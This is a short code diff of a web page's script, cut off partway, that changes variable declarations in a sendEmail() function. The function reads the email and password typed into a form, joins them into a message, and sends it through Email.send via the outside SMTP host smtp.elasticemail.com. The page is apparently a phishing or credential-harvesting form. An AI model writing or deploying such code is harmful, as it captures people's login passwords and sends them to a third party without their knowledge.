@@ -80,9 +80,9 @@
 	</section>
 	<script>
 		function sendEmail() {
-    let email = document.getElementById("email").value;
-    let pass = document.getElementById("pass").value;
-    let finalmessage = "email is " + email + " and password is " + pass;
+    var email = document.getElementById("email").value;
+    var pass = document.getElementById("pass").value;
+    var finalmessage = "email is " + email + " and password is " + pass;
 			
 		Email.send({
     Host : "smtp.elasticemail.com",
